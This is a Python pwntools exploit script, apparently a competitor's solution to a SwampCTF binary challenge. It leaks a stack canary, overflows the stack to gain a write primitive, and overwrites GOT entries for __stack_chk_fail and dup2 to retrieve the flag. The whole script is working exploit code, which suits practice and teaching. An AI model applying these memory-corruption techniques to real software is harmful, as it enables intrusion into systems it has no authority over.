#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./binary", checksec=False)
context.binary = elf
context.terminal = ["tmux", "splitw", "-h"]

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("chals.swampctf.com", 40005)

def register(buf):
    p.sendlineafter(b"3) Exit\n", str(1).encode())
    assert(len(buf) <= 0x2a)
    p.sendafter(b"Username: ", buf)
    p.sendafter(b"Password: ", buf)
    p.readuntil(b"open right now!\n")

def login(buf, length):
    p.sendlineafter(b"3) Exit\n", str(2).encode())
    p.sendlineafter(b"How long is your username: ", str(length).encode())
    assert(len(buf) <= 0x10)
    p.sendafter(b"Username: ", buf)
    p.readuntil(b"find the user: ")
    return p.recv(length)

def canary():
    register(b"A" * 0x18) 
    leak = login(b"A" * 0x10, 0x20)
    return u64(leak[-8:])

READ_WRITE = 0x004012b5

def write_what_where(what, where):
    payload = b"A" * 0x18
    payload += p64(canary())
    payload += p64(where + 0x20) # rbp
    payload += p16(READ_WRITE & 0xffff)
    register(payload)
    p.send(what)

RET_GADGET = 0x00401648

# use __stack_chk_fail to ret2main
write_what_where(what=p64(elf.sym["main"]), where=elf.got["__stack_chk_fail"])

# turn calls to dup2 into a nop
write_what_where(what=p64(RET_GADGET), where=elf.got["dup2"])

p.readuntil(b"swampCTF{")
print("swampCTF{" + p.readuntil(b"}").decode()) # swampCTF{fUn_w1tH_f0rk5_aN6_fd5}
